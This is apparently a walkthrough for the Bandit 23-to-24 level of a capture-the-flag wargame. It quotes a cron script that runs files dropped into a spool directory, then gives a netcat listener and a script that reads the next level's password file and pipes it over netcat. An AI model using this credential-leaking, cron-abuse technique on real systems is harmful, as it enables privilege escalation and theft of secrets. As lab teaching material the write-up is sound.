# Bandit 23 -> 24

- Bash script

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".."  ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23"  ]; then
        timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

- Executes scripts in /var/spool/bandit24 then deletes them
- Tried opening netcat port
- Tried saving to file in /tmp

## Netcat Solution

- Open netcat port

```bash
nc -v -l 127.0.0.1 -p 1337
```

- Create bash script exec.sh

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 1337

```

- Change execution bit of script

```bash
chmod +x exec.sh
```
